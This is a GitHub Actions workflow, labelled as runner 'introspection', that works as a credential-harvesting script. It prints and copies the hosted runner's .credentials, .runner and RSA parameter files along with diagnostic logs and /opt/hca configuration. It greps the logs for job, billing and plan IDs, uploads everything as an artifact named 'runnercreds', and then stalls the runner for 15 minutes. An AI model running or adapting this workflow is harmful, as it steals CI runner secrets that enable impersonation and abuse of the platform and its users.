name: runner-introspect
on:
  workflow_dispatch:
jobs:
  introspect:
    runs-on: ubuntu-latest
    steps:
      - name: mk
        run: mkdir -p out/diag
      - name: dump
        run: |
          set +e
          RD=/home/runner/actions-runner/cached/2.336.0
          { echo "== ls $RD"; ls -la $RD;
            echo "== .credentials"; cat $RD/.credentials;
            echo; echo "== .runner"; cat $RD/.runner;
            echo; echo "== rsaparams exists?"; ls -la $RD/.credentials_rsaparams 2>&1;
            echo "== ls _diag"; ls -la $RD/_diag;
            echo "== hca"; ls -la /opt/hca; cat /opt/hca/*.json 2>/dev/null | head -50;
          } > out/info.txt 2>&1
          cp $RD/.credentials out/ 2>/dev/null
          cp $RD/.runner out/ 2>/dev/null
          cp $RD/.credentials_rsaparams out/rsaparams.json 2>/dev/null
          cp $RD/_diag/*.log out/diag/ 2>/dev/null
          grep -rhoiE '(jobMessageId|messageId|billingOwnerId|planId|jobId|RunnerRequestId)["'\'': =]+[0-9a-fA-F-]{8,36}' $RD/_diag/ 2>/dev/null | sort -u > out/ids.txt
          du -sh out
      - uses: actions/upload-artifact@v4
        with:
          name: runnercreds
          path: out/
      - name: hold
        run: sleep 900
